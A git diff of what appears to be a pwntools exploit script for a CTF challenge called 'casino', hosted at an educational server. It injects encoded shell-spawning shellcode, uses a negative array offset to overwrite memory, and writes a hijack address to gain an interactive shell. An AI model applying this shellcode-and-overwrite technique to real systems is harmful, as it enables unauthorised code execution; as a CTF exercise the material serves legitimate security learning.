@@ -5,7 +5,7 @@ from pwn import *
 context.clear(arch='x86_64')
 sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
 # sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-sc = b'\x00' * 64 + sc
+sc = b'\x00' * 32 + sc
 print('sc ', sc)
 
 # random number
@@ -16,6 +16,7 @@ p.close()
 
 # send
 # r = process("./casino")
+pause()
 # elf = ELF("./casino")
 r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', sc)
@@ -26,18 +27,15 @@ offset = -176 / 4
 
 for cnt_try in range(0, 2):
     cnt_num = 0
-    print('round ', cnt_try)
     if cnt_try == 1:
         for i in numbers:
             r_out = 'Chose the number ' + str(cnt_num) + ': '
             r.sendlineafter(r_out, str(i))
-            print('sending number ', i)
             cnt_num += 1
     elif cnt_try == 0:
         for i in range(0, 6):
             r_out = 'Chose the number ' + str(cnt_num) + ': '
             r.sendlineafter(r_out, str(i))
-            print('sending number ', i)
             cnt_num += 1
 
     r.sendlineafter('0:no]:', '1')
@@ -54,7 +52,10 @@ for cnt_try in range(0, 2):
         print('fffffinished sending offset ', str(offset + 1))
 
         r_out = 'Chose the number ' + str(offset) + ': '
-        r.sendlineafter(r_out, '6299888')
+        hijack = 0x602110
+        hijack = str(hijack)
+        print('hijack ', hijack)
+        r.sendlineafter(r_out, hijack)
 
 r.interactive()
 r.close()
